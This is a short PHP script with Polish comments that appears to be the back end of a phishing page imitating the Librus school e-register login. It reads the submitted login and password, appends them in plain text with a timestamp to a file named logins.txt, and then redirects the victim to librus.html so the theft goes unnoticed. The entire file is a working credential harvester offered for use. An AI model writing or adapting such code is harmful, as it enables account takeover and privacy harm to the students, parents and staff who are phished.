<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $login = $_POST['login'];
    $haslo = $_POST['password'];
    $godzina = date('Y-m-d H:i:s'); // Pobranie aktualnej godziny w formacie YYYY-MM-DD HH:MM:SS

    // Formatowanie danych do zapisu
    $dataToSave = "Login: $login\nHasło: $haslo\nGodzina logowania: $godzina\n\n";

    // Ścieżka do pliku, gdzie będą zapisywane dane logowania
    $filePath = 'logins.txt';

    // Zapis danych logowania do pliku
    file_put_contents($filePath, $dataToSave, FILE_APPEND);

    header("Location: librus.html");
    exit;
}
?>
